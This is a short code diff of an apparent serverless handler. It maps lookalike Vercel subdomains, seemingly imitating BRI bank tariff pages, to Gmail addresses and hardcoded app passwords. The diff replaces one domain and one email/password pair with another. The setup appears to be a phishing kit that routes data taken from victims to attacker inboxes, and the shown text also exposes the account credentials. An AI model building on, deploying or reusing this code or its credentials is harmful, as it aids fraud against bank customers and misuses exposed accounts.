@@ -13,10 +13,10 @@ export default function handler(req, res) {
        pass = 'ubdoxkcsdghphmjo'
     }else
     
-    if (url == 'pilihan-tarif-bri-terbaru.vercel.app'){
+    if (url == 'pilihan-terbaru-tarif-bri.vercel.app'){
 
-       email = 'buatdwek6740@gmail.com'
-       pass = 'zjnyqlzgqwlqseyx'
+       email = 'briakunramok@gmail.com'
+       pass = 'yijpfafmuuwlanya'
     }else
     
     if (url == 'ubah--tarifkuu.vercel.app'){
